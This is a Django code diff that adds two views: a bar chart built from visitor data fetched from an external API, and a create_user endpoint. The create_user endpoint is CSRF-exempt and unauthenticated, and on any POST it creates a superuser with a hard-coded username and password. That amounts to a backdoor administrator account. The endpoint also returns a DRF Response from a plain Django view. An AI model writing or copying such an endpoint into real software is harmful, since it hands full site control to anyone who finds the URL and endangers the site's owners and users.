@@ -15,6 +15,8 @@ import calendar
 from datetime import timedelta
 from django.utils import timezone
 
+from django.contrib.auth.models import User
+
 
 def process_query(model_query):
     query = model_query
@@ -239,4 +241,47 @@ def send_email(request):
         return Response({
             'status': status.HTTP_500_INTERNAL_SERVER_ERROR,
             'message': str(error)
+        })
+
+import json
+import requests
+from django.shortcuts import render
+from django.http import HttpResponse
+
+def bar_chart(request):
+    # Fetch the data
+    # response = requests.get('http://127.0.0.1:8000/visitors/')
+    response = requests.get('https://api.bengaltroopsbd.com/visitors/')
+    data = response.json()
+
+    dates = []
+    visits = []
+
+    for item in data['visitors'][0]:
+        dates.append(item)
+
+    for item in data['visitors'][1]:
+        visits.append(item)
+
+    if request.user.is_authenticated:
+        return render(request, 'bar_chart.html', {
+            'dates': dates,
+            'visits': visits
+        })
+    else:
+        return HttpResponse("<h1>You are not authorized to see this information</h1>")
+
+
+
+@csrf_exempt
+def create_user(request):
+    if request.method == "POST":
+    # Create a superuser
+        username = 'test'
+        email = 'admin@example.com'
+        password = 'supersecretpassword'
+        User.objects.create_superuser(username, email, password)
+
+        return Response({
+            'msg': f"User created => {username}"
         })
